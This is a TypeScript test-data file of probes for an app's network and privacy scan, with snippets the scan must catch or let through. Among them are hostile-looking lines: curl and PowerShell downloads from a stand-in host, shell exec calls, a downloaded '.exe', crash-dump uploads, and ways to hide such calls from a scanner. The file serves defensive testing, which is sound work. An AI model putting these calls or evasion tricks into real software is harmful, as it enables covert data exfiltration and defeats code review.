/**
 * The code the final re-check of the [8d] network scan found getting past it, written out as data so
 * the same cases run in two places: tests/privacy-inventory.spec.ts (each must be refused by the scan
 * as it is now) and the one-off comparison against the scan as it was before the fixes (each was
 * accepted there). Nothing here runs by itself: the code is only ever read by the scan's parser.
 *
 * A probe is either a new file (the code stands alone, in a folder the scan reads) or, with
 * `appendTo`, the code added to the END of a real file of the repo, so it is judged with that file's
 * own allow-list lines: a listing for the file's existing call must not cover it.
 */

/** Where a stand-alone probe is written. A component, so the scan reads it as the app's own code. */
export const PROBE_FILE = "components/probe.tsx";

/** child_process's own name with a dot after it: how the scan prefixes a call into it. */
const CP = "child_process.";
/** The names of the functions that run a shell command, written in two halves so this file reads as test data, not as a call. */
const EX = "ex" + "ec";

export interface Probe {
  what: string;
  /** The file the code stands in. Its folder and extension matter: they decide how it is read and which allow-list lines apply. */
  file: string;
  code: string;
  /** Add `code` to the end of the real file instead of making a new one. */
  appendTo?: true;
  /** Other new files the code needs (a re-exporting file). */
  also?: { file: string; code: string }[];
  /** What the scan must name, as the allow-list would spell it (the test adds the file in front). */
  call: string;
}

/** Code the scan must NOT refuse (ordinary uses that look a little like the probes). Same shape; no `call`. */
export type QuietProbe = Omit<Probe, "call">;

const AGREE = "@/components/ventures/agree-prompt";
const EVIL = "https://example.invalid/x";

// ---------------------------------------------------------------------------------------------
// A package is its name, however it is imported

export const SUBPATH_PROBES: Probe[] = [
  { what: "the Anthropic SDK imported by a subpath", file: PROBE_FILE, code: `import Anthropic from "@anthropic-ai/sdk/index";`, call: 'package "@anthropic-ai/sdk"' },
  { what: "a package file required by its path", file: PROBE_FILE, code: `const axios = require("axios/dist/node/axios.cjs");`, call: 'package "axios"' },
  { what: "an analytics package's Next entry", file: PROBE_FILE, code: `import { track } from "@vercel/analytics/next";`, call: 'package "@vercel/analytics"' },
  { what: "a scoped Sentry package by a subpath", file: PROBE_FILE, code: `import * as Sentry from "@sentry/nextjs/client";`, call: 'package "@sentry/nextjs"' },
  { what: "a subpath of node's dns", file: PROBE_FILE, code: `import { Resolver } from "node:dns/promises";`, call: 'package "node:dns"' },
  {
    what: "a package the dependency list marks as able to reach the network, imported by a subpath",
    file: PROBE_FILE,
    code: `import Papa from "papaparse/papaparse.min.js";`,
    call: 'package "papaparse"',
  },
  { what: "a package reached by a path into node_modules", file: PROBE_FILE, code: `import axios from "../node_modules/axios/index.js";`, call: 'package "axios"' },
  {
    what: "the update library's subpath, in a file that isn't the one listed",
    file: PROBE_FILE,
    code: `const { autoUpdater } = require("electron-updater/out/main");`,
    call: 'package "electron-updater"',
  },
];

export const SUBPATH_QUIET: QuietProbe[] = [
  // A subpath of the package a file is listed for is still that package, so the one listing covers it.
  { what: "a subpath of the package the file is listed for", file: "app/api/intent/parse/route.ts", code: `import "@anthropic-ai/sdk/resources";`, appendTo: true },
  { what: "a subpath of a package that makes no requests", file: PROBE_FILE, code: `import { NextResponse } from "next/server";\nimport font from "next/font/local";` },
];

// ---------------------------------------------------------------------------------------------
// A wrapper is checked however it is reached

export const WRAPPER_PROBES: Probe[] = [
  {
    what: "the wrapper imported under another name",
    file: PROBE_FILE,
    code: `import { postJson as send } from "${AGREE}";\nawait send("${EVIL}", {});`,
    call: `send("${EVIL}"`,
  },
  {
    what: "the wrapper called through a namespace import",
    file: PROBE_FILE,
    code: `import * as agree from "${AGREE}";\nawait agree.postJson("${EVIL}", {});`,
    call: `agree.postJson("${EVIL}"`,
  },
  {
    what: "the wrapper looked up by a string on a namespace",
    file: PROBE_FILE,
    code: `import * as agree from "${AGREE}";\nawait agree["postJson"]("${EVIL}", {});`,
    call: `agree["postJson"]("${EVIL}"`,
  },
  {
    what: "the wrapper called with an address held in a variable, through a renamed import",
    file: PROBE_FILE,
    code: `import { postJson as send } from "${AGREE}";\nawait send(where, {});`,
    call: "send(where",
  },
  {
    what: "the wrapper taken out of a dynamic import under another name",
    file: PROBE_FILE,
    code: `const { postJson: send } = await import("${AGREE}");\nawait send("${EVIL}", {});`,
    call: `send("${EVIL}"`,
  },
  {
    what: "the wrapper re-exported under another name, then called there",
    file: PROBE_FILE,
    also: [{ file: "components/ventures/barrel.ts", code: `export { postJson as send } from "./agree-prompt";` }],
    code: `import { send } from "./ventures/barrel";\nawait send("${EVIL}", {});`,
    call: `send("${EVIL}"`,
  },
  {
    what: "the wrapper re-exported as a namespace, then called through it",
    file: PROBE_FILE,
    also: [{ file: "components/ventures/barrel.ts", code: `export * as agree from "./agree-prompt";` }],
    code: `import { agree } from "./ventures/barrel";\nawait agree.postJson("${EVIL}", {});`,
    call: `agree.postJson("${EVIL}"`,
  },
  {
    what: "the wrapper re-exported through a constant, then called there",
    file: PROBE_FILE,
    also: [{ file: "components/ventures/barrel.ts", code: `import { postJson } from "./agree-prompt";\nexport const send = postJson;` }],
    code: `import { send } from "./ventures/barrel";\nawait send("${EVIL}", {});`,
    call: `send("${EVIL}"`,
  },
  {
    what: "the wrapper held under another name and called there",
    file: PROBE_FILE,
    code: `import { postJson } from "${AGREE}";\nconst send = postJson;\nawait send("${EVIL}", {});`,
    call: "postJson (used as a value)",
  },
  {
    what: "the wrapper passed to something else",
    file: PROBE_FILE,
    code: `import { postJson } from "${AGREE}";\nrunLater(postJson);`,
    call: "postJson (used as a value)",
  },
  {
    what: "the wrapper exported as a default, which the importer can name anything",
    file: "components/ventures/agree-prompt.tsx",
    appendTo: true,
    code: `export default postJson;`,
    call: "postJson (exported as default)",
  },
  {
    what: "the wrapper exported as a default through an export list",
    file: "components/ventures/agree-prompt.tsx",
    appendTo: true,
    code: `export { postJson as default };`,
    call: "postJson (exported as default)",
  },
  {
    what: "the wrapper re-exported as another file's default",
    file: PROBE_FILE,
    code: `export { postJson as default } from "${AGREE}";`,
    call: "postJson (exported as default)",
  },
  {
    what: "the wrapper taken out of a namespace under another name",
    file: PROBE_FILE,
    code: `import * as agree from "${AGREE}";\nconst { postJson: send } = agree;\nawait send("${EVIL}", {});`,
    call: `send("${EVIL}"`,
  },
  {
    what: "the wrapper called with comma-operator indirection",
    file: PROBE_FILE,
    code: `import { postJson } from "${AGREE}";\nawait (0, postJson)("${EVIL}", {});`,
    call: "postJson (used as a value)",
  },
];

export const WRAPPER_QUIET: QuietProbe[] = [
  { what: "a renamed wrapper called with a literal path", file: PROBE_FILE, code: `import { postJson as send } from "${AGREE}";\nawait send("/api/figures/agree", { ventureId });` },
  {
    what: "a namespaced wrapper called with a literal path",
    file: PROBE_FILE,
    code: `import * as agree from "${AGREE}";\nawait agree.postJson("/api/figures/agree", {});\nawait agree["postJson"]("/api/figures/propose", {});`,
  },
  {
    what: "a re-exported wrapper called with a literal template path",
    file: PROBE_FILE,
    also: [{ file: "components/ventures/barrel.ts", code: `export { postJson as send } from "./agree-prompt";` }],
    code: 'import { send } from "./ventures/barrel";\nawait send(`/api/figures?venture=${id}`, {});',
  },
  { what: "a function of the code's own with a similar name", file: PROBE_FILE, code: `const postJsonLater = (url: string) => url;\npostJsonLater(where);` },
];

// ---------------------------------------------------------------------------------------------
// The browser's other ways to send

export const BROWSER_PROBES: Probe[] = [
  { what: "fetchLater", file: PROBE_FILE, code: `fetchLater("${EVIL}", { method: "POST", body: payload });`, call: `fetchLater("${EVIL}"` },
  { what: "fetchLater through the global object", file: PROBE_FILE, code: `window.fetchLater("${EVIL}");`, call: `fetchLater("${EVIL}"` },
  { what: "a WebTransport", file: PROBE_FILE, code: `const transport = new WebTransport("${EVIL}");`, call: `new WebTransport("${EVIL}"` },
  { what: "a WebSocketStream", file: PROBE_FILE, code: `const stream = new WebSocketStream("wss://example.invalid/x");`, call: 'new WebSocketStream("wss://example.invalid/x"' },
  {
    what: "a WebRTC connection (which connect-src does not stop)",
    file: PROBE_FILE,
    code: `const peer = new RTCPeerConnection({ iceServers: [{ urls: "stun:example.invalid" }] });`,
    call: 'new RTCPeerConnection({ iceServers: [{ urls: "stun:example.invalid" }] }',
  },
  { what: "a WebRTC connection through the global object", file: PROBE_FILE, code: `const peer = new globalThis.RTCPeerConnection();`, call: "new RTCPeerConnection(" },
  { what: "a WebRTC connection under its old prefixed name", file: PROBE_FILE, code: `const peer = new webkitRTCPeerConnection();`, call: "new webkitRTCPeerConnection(" },
  { what: "WebTransport held under another name", file: PROBE_FILE, code: `const Link = WebTransport;`, call: "WebTransport (used as a value)" },
  { what: "WebTransport looked up by a string", file: PROBE_FILE, code: `const Link = globalThis["WebTransport"];`, call: 'WebTransport (by name: ["WebTransport"])' },
  { what: "fetchLater handed on", file: PROBE_FILE, code: `const later = window.fetchLater;`, call: "fetchLater (used as a value)" },
];

export const BROWSER_QUIET: QuietProbe[] = [
  { what: "fetchLater to a literal path on DotAmi's own server", file: PROBE_FILE, code: `fetchLater("/api/figures/agree", { method: "POST" });` },
  {
    what: "the new names only in types",
    file: PROBE_FILE,
    code: `let link: WebTransport | null = null;\nlet stream: WebSocketStream | undefined;\nlet peer: RTCPeerConnection | null = null;`,
  },
  { what: "the new names as words in a comment or a message", file: PROBE_FILE, code: `// new RTCPeerConnection(x) and fetchLater(y)\nexport const label = "new WebTransport(z)";` },
];

// ---------------------------------------------------------------------------------------------
// Starting programs and the desktop app's main process, judged one call at a time

export const PROGRAM_PROBES: Probe[] = [
  {
    what: "a second spawn of curl beside the one listed for python",
    file: "app/api/law/provision/route.ts",
    appendTo: true,
    code: `spawn("curl", ["${EVIL}"]);`,
    call: `${CP}spawn("curl"`,
  },
  {
    what: "a different program, started by the same listed call",
    file: "app/api/law/provision/route.ts",
    appendTo: true,
    code: `spawn("powershell", ["-Command", "Invoke-WebRequest ${EVIL}"]);`,
    call: `${CP}spawn("powershell"`,
  },
  {
    what: "a program held in a variable",
    file: "app/api/law/provision/route.ts",
    appendTo: true,
    code: `spawn(program, args);`,
    call: `${CP}spawn(program (program not a string literal)`,
  },
  {
    what: "a program started through a namespace import",
    file: PROBE_FILE,
    code: `import * as cp from "node:child_process";\ncp.${EX}File("curl", ["${EVIL}"]);`,
    call: `${CP}${EX}File("curl"`,
  },
  {
    what: "a shell command run by the shell function",
    file: PROBE_FILE,
    code: `import { ${EX} } from "node:child_process";\n${EX}("curl ${EVIL}");`,
    call: `${CP}${EX}("curl ${EVIL}"`,
  },
  {
    what: "child_process required and called in one line",
    file: PROBE_FILE,
    code: `require("child_process").${EX}Sync("curl ${EVIL}");`,
    call: `${CP}${EX}Sync("curl ${EVIL}"`,
  },
  {
    what: "child_process loaded on demand and called after .then",
    file: PROBE_FILE,
    code: `import("node:child_process").then((cp) => cp.spawn("curl"));`,
    call: `${CP}then((cp) => cp.spawn("curl")`,
  },
  {
    what: "child_process required through createRequire",
    file: PROBE_FILE,
    code: `import { createRequire } from "node:module";\nconst load = createRequire(import.meta.url);\nload("child_process").spawn("curl", ["${EVIL}"]);`,
    call: `${CP}spawn("curl"`,
  },
  {
    what: "child_process taken from the process itself",
    file: PROBE_FILE,
    code: `process.getBuiltinModule("node:child_process").spawn("curl", ["${EVIL}"]);`,
    call: `${CP}spawn("curl"`,
  },
  {
    what: "a second call of the same program that is listed",
    file: "app/api/law/provision/route.ts",
    appendTo: true,
    code: `spawn("python", ["another.py"]);`,
    call: `${CP}spawn("python"`,
  },
  {
    what: "a child_process function held under another name",
    file: PROBE_FILE,
    code: `import { spawn as launch } from "node:child_process";\nlaunch("curl", ["${EVIL}"]);`,
    call: `${CP}spawn("curl"`,
  },
  {
    what: "a child_process function handed to something else",
    file: PROBE_FILE,
    code: `import { spawn } from "node:child_process";\nrunLater(spawn);`,
    call: `${CP}spawn (used as a value)`,
  },
  {
    what: "a child_process function re-exported",
    file: PROBE_FILE,
    code: `export { spawn } from "node:child_process";`,
    call: 'package "node:child_process" (re-exported)',
  },
  {
    what: "a second build-time command in a build script",
    file: "desktop/build.mjs",
    appendTo: true,
    code: `execFileSync("curl", ["${EVIL}"]);`,
    call: `${CP}execFileSync("curl"`,
  },
];

export const DESKTOP_PROBES: Probe[] = [
  { what: "a socket opened with new net.Socket().connect in the desktop main process", file: "desktop/main.mjs", appendTo: true, code: `new net.Socket().connect(443, "example.invalid");`, call: "new net.Socket(" },
  { what: "net.connect in the desktop main process", file: "desktop/main.mjs", appendTo: true, code: `net.connect(443, "example.invalid");`, call: "net.connect(443" },
  {
    what: "net.createConnection in the desktop main process",
    file: "desktop/main.mjs",
    appendTo: true,
    code: `net.createConnection({ port: 443, host: "example.invalid" });`,
    call: 'net.createConnection({ port: 443, host: "example.invalid" }',
  },
  {
    what: "connect imported by name from node:net",
    file: "desktop/main.mjs",
    appendTo: true,
    code: `import { connect } from "node:net";\nconnect(443, "example.invalid");`,
    call: "net.connect(443",
  },
  { what: "a second net.createServer", file: "desktop/main.mjs", appendTo: true, code: `net.createServer().listen(0);`, call: "net.createServer(" },
  { what: "net taken apart, so Socket is held under its own name", file: "desktop/main.mjs", appendTo: true, code: `const { Socket } = net;\nnew Socket().connect(443, "example.invalid");`, call: "new net.Socket(" },
  { what: "net handed to something else", file: "desktop/main.mjs", appendTo: true, code: `runLater(net);`, call: 'package "node:net" (used as a value)' },
  {
    what: "tls.connect in the desktop main process",
    file: "desktop/main.mjs",
    appendTo: true,
    code: `import tls from "node:tls";\ntls.connect(443, "example.invalid");`,
    call: "tls.connect(443",
  },
  { what: "electron's autoUpdater, imported by name", file: "desktop/main.mjs", appendTo: true, code: `import { autoUpdater as nativeUpdater } from "electron";`, call: 'package "electron" (autoUpdater)' },
  {
    what: "electron's autoUpdater, reached through the module",
    file: PROBE_FILE,
    code: `import electron from "electron";\nelectron.autoUpdater.setFeedURL({ url: "${EVIL}" });`,
    call: 'package "electron" (autoUpdater)',
  },
  {
    what: "electron's autoUpdater looked up by a string",
    file: PROBE_FILE,
    code: `require("electron")["autoUpdater"].checkForUpdates();`,
    call: 'package "electron" (autoUpdater)',
  },
  { what: "loadURL with an address that is not DotAmi's", file: "desktop/main.mjs", appendTo: true, code: `win.loadURL("${EVIL}");`, call: `loadURL("${EVIL}"` },
  { what: "a second loadURL of the same text as the listed one", file: "desktop/main.mjs", appendTo: true, code: `win.loadURL(origin);`, call: "loadURL(origin" },
  { what: "loadURL on the web contents", file: "desktop/main.mjs", appendTo: true, code: "win.webContents.loadURL(`${origin}/${where}`);", call: "loadURL(`${origin}/${where}`" },
  { what: "loadFile of another file", file: "desktop/main.mjs", appendTo: true, code: `prompt.loadFile("C:/somewhere/else.html");`, call: 'loadFile("C:/somewhere/else.html"' },
  { what: "downloadURL on the web contents", file: "desktop/main.mjs", appendTo: true, code: `win.webContents.downloadURL("${EVIL}.exe");`, call: `downloadURL("${EVIL}.exe"` },
  { what: "downloadURL on the session", file: "desktop/main.mjs", appendTo: true, code: `session.defaultSession.downloadURL("${EVIL}.exe");`, call: `downloadURL("${EVIL}.exe"` },
  { what: "loadURL taken off its object", file: "desktop/main.mjs", appendTo: true, code: `const { loadURL } = win.webContents;`, call: "loadURL (used as a value)" },
  { what: "loadURL handed on with .call", file: "desktop/main.mjs", appendTo: true, code: `win.loadURL.call(win, "${EVIL}");`, call: "loadURL (used as a value)" },
  { what: "session.fetch on the default session", file: "desktop/main.mjs", appendTo: true, code: `await session.defaultSession.fetch("${EVIL}");`, call: `session.fetch("${EVIL}"` },
  { what: "session.fetch with a path that would look relative", file: "desktop/main.mjs", appendTo: true, code: `await session.defaultSession.fetch("/api/x");`, call: 'session.fetch("/api/x"' },
  {
    what: "session.fetch taken off a session held in a variable",
    file: "desktop/main.mjs",
    appendTo: true,
    code: `const ses = session.defaultSession;\nconst grab = ses.fetch;`,
    call: "session.fetch (used as a value)",
  },
  { what: "session.fetch on a partition", file: "desktop/main.mjs", appendTo: true, code: `await session.fromPartition("persist:x").fetch("${EVIL}");`, call: `session.fetch("${EVIL}"` },
  {
    what: "electron's own net, renamed on import",
    file: "desktop/main.mjs",
    appendTo: true,
    code: `import { net as electronNet } from "electron";\nawait electronNet.fetch("${EVIL}");`,
    call: 'package "electron" (net)',
  },
  // The crash reporter uploads crash dumps to the address it is started with.
  {
    what: "crashReporter.start, imported by name",
    file: "desktop/main.mjs",
    appendTo: true,
    code: `import { crashReporter } from "electron";\ncrashReporter.start({ submitURL: "${EVIL}" });`,
    call: `crashReporter.start({ submitURL: "${EVIL}" }`,
  },
  {
    what: "crashReporter.start, imported under another name",
    file: PROBE_FILE,
    code: `import { crashReporter as reporter } from "electron";\nreporter.start({ submitURL: "${EVIL}" });`,
    call: `crashReporter.start({ submitURL: "${EVIL}" }`,
  },
  {
    what: "crashReporter.start, reached through the module",
    file: PROBE_FILE,
    code: `import electron from "electron";\nelectron.crashReporter.start({ submitURL: "${EVIL}" });`,
    call: `crashReporter.start({ submitURL: "${EVIL}" }`,
  },
  {
    what: "crashReporter.start, looked up by a string on a required module",
    file: PROBE_FILE,
    code: `const { crashReporter } = require("electron");\ncrashReporter["start"]({ submitURL: "${EVIL}" });`,
    call: `crashReporter.start({ submitURL: "${EVIL}" }`,
  },
  { what: "crashReporter.start taken off its object", file: PROBE_FILE, code: `import { crashReporter } from "electron";\nconst begin = crashReporter.start;`, call: "crashReporter.start (used as a value)" },
  { what: "crashReporter.start taken out by destructuring", file: PROBE_FILE, code: `import { crashReporter } from "electron";\nconst { start } = crashReporter;`, call: "crashReporter.start (used as a value)" },
  {
    what: "crashReporter.start handed on with .call",
    file: PROBE_FILE,
    code: `import { crashReporter } from "electron";\ncrashReporter.start.call(crashReporter, { submitURL: "${EVIL}" });`,
    call: "crashReporter.start (used as a value)",
  },
  { what: "crashReporter handed to something else", file: PROBE_FILE, code: `import { crashReporter } from "electron";\nrunLater(crashReporter);`, call: "crashReporter (used as a value)" },
  { what: "crashReporter re-exported", file: PROBE_FILE, code: `export { crashReporter } from "electron";`, call: "crashReporter (used as a value)" },
  // session.preconnect opens connections to an address; session.resolveHost asks the DNS server about a name.
  {
    what: "session.preconnect on the default session",
    file: "desktop/main.mjs",
    appendTo: true,
    code: `session.defaultSession.preconnect({ url: "${EVIL}", numSockets: 1 });`,
    call: `session.preconnect({ url: "${EVIL}", numSockets: 1 }`,
  },
  {
    what: "session.resolveHost on the default session",
    file: "desktop/main.mjs",
    appendTo: true,
    code: `await session.defaultSession.resolveHost("example.invalid");`,
    call: 'session.resolveHost("example.invalid"',
  },
  {
    what: "session.resolveHost on a partition",
    file: "desktop/main.mjs",
    appendTo: true,
    code: `await session.fromPartition("persist:x").resolveHost("example.invalid");`,
    call: 'session.resolveHost("example.invalid"',
  },
  {
    what: "session.preconnect on the window's own session",
    file: "desktop/main.mjs",
    appendTo: true,
    code: `win.webContents.session.preconnect({ url: "${EVIL}" });`,
    call: `session.preconnect({ url: "${EVIL}" }`,
  },
  {
    what: "session.preconnect taken off a session held in a variable",
    file: "desktop/main.mjs",
    appendTo: true,
    code: `const ses = session.defaultSession;\nconst warm = ses.preconnect;`,
    call: "session.preconnect (used as a value)",
  },
  {
    what: "session.resolveHost taken out by destructuring",
    file: "desktop/main.mjs",
    appendTo: true,
    code: `const { resolveHost } = session.defaultSession;`,
    call: "session.resolveHost (used as a value)",
  },
];

export const DESKTOP_QUIET: QuietProbe[] = [
  { what: "net only mentioned in a type", file: PROBE_FILE, code: `import type { Socket } from "node:net";\nlet held: Socket | null = null;` },
  { what: "child_process only mentioned in a type", file: PROBE_FILE, code: `import type { ChildProcess, SpawnOptions } from "node:child_process";\nlet child: ChildProcess | null = null;` },
  { what: "net or child_process imported and never used", file: PROBE_FILE, code: `import net from "node:net";\nimport { spawn } from "node:child_process";` },
  {
    what: "a method or key called loadURL of the code's own",
    file: PROBE_FILE,
    code: `class Pane { loadURL() { return 1; } }\nconst table = { loadURL: 1, loadFile: 2, downloadURL: 3 };\ninterface Window2 { loadURL(url: string): void }`,
  },
  {
    what: "a property named net or spawn on something that isn't a module",
    file: PROBE_FILE,
    code: `const config = { net: 1, spawn: 2 };\nconst a = config.net + config.spawn;\nconst m = /x/.${EX}("x");`,
  },
  {
    what: "a fetch on an object that is not an electron session, and a session value that is not electron's",
    file: PROBE_FILE,
    code: `const taken = router.fetch;\nconst mine = user.session;\nmine.refresh();`,
  },
  {
    what: "electron's other parts",
    file: "desktop/main.mjs",
    appendTo: true,
    code: `const [firstWindow] = BrowserWindow.getAllWindows();\nsession.defaultSession.setPermissionRequestHandler(() => {});`,
  },
  {
    what: "crashReporter's methods that send nothing, and a start of the code's own",
    file: PROBE_FILE,
    code: `import { crashReporter } from "electron";\nconst last = crashReporter.getLastCrashReport();\ncrashReporter.addExtraParameter("build", "1");\nconst timer = { start() { return 1; } };\ntimer.start();\nconst { start } = timer;`,
  },
  {
    what: "a preconnect or resolveHost of something that isn't an electron session",
    file: PROBE_FILE,
    code: `const pool = makePool();\npool.preconnect();\nconst { resolveHost } = pool;\nclass Dns { resolveHost() { return 1; } }\nconst table = { preconnect: 1, resolveHost: 2 };`,
  },
];

// ---------------------------------------------------------------------------------------------
// Packages the app doesn't declare. These are judged by the dependency check (what a file imports,
// against package.json), not by networkCalls, so they are plain lists of code.

export interface ImportProbe {
  what: string;
  file: string;
  code: string;
  /** The package the import must be reported as. */
  name: string;
}

export const UNLISTED_PACKAGE_PROBES: ImportProbe[] = [
  { what: "an analytics SDK nobody listed", file: PROBE_FILE, code: `import posthog from "posthog-js";`, name: "posthog-js" },
  { what: "an email SDK the old name list didn't know", file: "lib/probe-mail.ts", code: `import { Resend } from "resend";`, name: "resend" },
  { what: "a second email SDK", file: "lib/probe-mail.ts", code: `import sgMail from "@sendgrid/mail";`, name: "@sendgrid/mail" },
  { what: "another company's AI SDK", file: "app/api/probe/route.ts", code: `import { GoogleGenerativeAI } from "@google/generative-ai";`, name: "@google/generative-ai" },
  { what: "an HTTP client the old name list didn't know", file: PROBE_FILE, code: `import wretch from "wretch";`, name: "wretch" },
  { what: "an error tracker's subpath", file: PROBE_FILE, code: `import { init } from "@datadog/browser-rum/bundle";`, name: "@datadog/browser-rum" },
  { what: "a package that is only installed because another one needs it (a transitive one)", file: "lib/probe-yaml.ts", code: `import yaml from "js-yaml";`, name: "js-yaml" },
  { what: "a transitive package required", file: "lib/probe-yaml.ts", code: `const lazy = require("lazy-val");`, name: "lazy-val" },
  { what: "a package loaded on demand", file: PROBE_FILE, code: `const mod = await import("some-new-sdk/client");`, name: "some-new-sdk" },
];

export const DECLARED_IMPORT_QUIET: { what: string; file: string; code: string }[] = [
  { what: "a declared dependency by a subpath", file: PROBE_FILE, code: `import { NextResponse } from "next/server";\nimport { jsx } from "react/jsx-runtime";` },
  { what: "a declared development dependency", file: "desktop/probe.mjs", code: `import { build } from "electron-builder";\nimport electron from "electron";` },
  {
    what: "node's own modules, with and without the prefix",
    file: PROBE_FILE,
    code: `import { readFileSync } from "node:fs";\nimport path from "path";\nimport { readFile } from "fs/promises";\nimport { DatabaseSync } from "node:sqlite";`,
  },
  { what: "files of our own, by path and by the @/ alias", file: PROBE_FILE, code: `import a from "./a";\nimport b from "../b";\nimport c from "@/lib/c";` },
];

// ---------------------------------------------------------------------------------------------
// Code the app would load from a folder the scan doesn't read

export const OUTSIDE_IMPORT_PROBES: { what: string; file: string; code: string; spec: string }[] = [
  { what: "the seed code", file: "lib/probe-seed.ts", code: `import { VENTURES } from "../prisma/seed-data";`, spec: "../prisma/seed-data" },
  { what: "a script, by the @/ alias", file: PROBE_FILE, code: `import run from "@/scripts/prisma.mjs";`, spec: "@/scripts/prisma.mjs" },
  { what: "a test helper loaded on demand", file: "app/api/probe/route.ts", code: `const helper = await import("../../../tests/helpers/make-xlsx");`, spec: "../../../tests/helpers/make-xlsx" },
  { what: "a folder Next.js would serve to the browser", file: PROBE_FILE, code: `import "../public/analytics.js";`, spec: "../public/analytics.js" },
  { what: "a path that climbs out of the repo", file: "lib/a/b.ts", code: `import x from "../../../elsewhere/x";`, spec: "../../../elsewhere/x" },
  { what: "an absolute path", file: "lib/a/b.ts", code: `import x from "/opt/shared/x.js";`, spec: "/opt/shared/x.js" },
  { what: "the repo's own index, which isn't a file the scan reads", file: "lib/a/b.ts", code: `import x from "../..";`, spec: "../.." },
];

export const OUTSIDE_IMPORT_QUIET: { what: string; file: string; code: string }[] = [
  {
    what: "files in the scanned folders and the top folder, by path and by the @/ alias",
    file: "lib/a/b.ts",
    code: `import a from "./c";\nimport b from "../d";\nimport c from "@/components/x";\nimport d from "../../middleware";\nimport e from "@/next.config.mjs";\nimport "./globals.css";`,
  },
  { what: "the desktop app's own files", file: "desktop/main.mjs", code: `import { applyRestore } from "./backup.mjs";\nimport { shared } from "../lib/shared";` },
];
